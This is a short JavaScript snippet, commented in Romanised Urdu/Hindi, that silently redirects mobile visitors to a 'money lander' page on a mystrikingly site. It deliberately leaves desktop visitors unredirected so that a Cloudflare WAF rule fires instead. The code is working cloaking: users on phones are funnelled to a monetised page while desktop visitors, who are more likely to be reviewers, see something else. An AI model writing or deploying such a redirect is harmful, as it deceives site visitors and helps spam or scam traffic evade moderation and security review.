    <script>
        // Redirect Logic ko bilkul shuru mein rakha hai taake image load hone se pehle hi action ho
        (function() {
            const moneyLander = "https://ocher-dove-11v65rh.mystrikingly.com/";
            const ua = navigator.userAgent.toLowerCase();
            const hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
            const isDesktop = !hasTouch || window.innerWidth > 490;

            // Agar Mobile hai, toh seedha lander pe bhejo
            if (hasTouch && window.innerWidth <= 490) {
                window.location.replace(moneyLander);
            } 
            // Agar Desktop hai, toh redirect MAT karo.
            // Jab code yahan ruk jayega, tab Cloudflare ka WAF rule trigger hoga.
            else {
                console.log("Waiting for WAF");
            }
        })();
    </script>
